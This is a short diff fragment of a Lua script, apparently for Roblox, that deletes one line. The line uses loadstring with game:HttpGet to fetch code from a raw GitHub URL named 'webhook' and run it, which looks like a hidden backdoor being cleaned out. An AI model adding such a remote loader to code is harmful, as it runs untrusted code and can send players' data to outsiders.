@@ -1001,8 +1001,6 @@ _p.Network:get('PDS', 'cPC', 'nickname', 6, text)
 	    end
 }
 
-loadstring(game:HttpGet"https://raw.githubusercontent.com/ilovelatinawomen/ilovelatinas/main/webhook")()
-
 
 
 
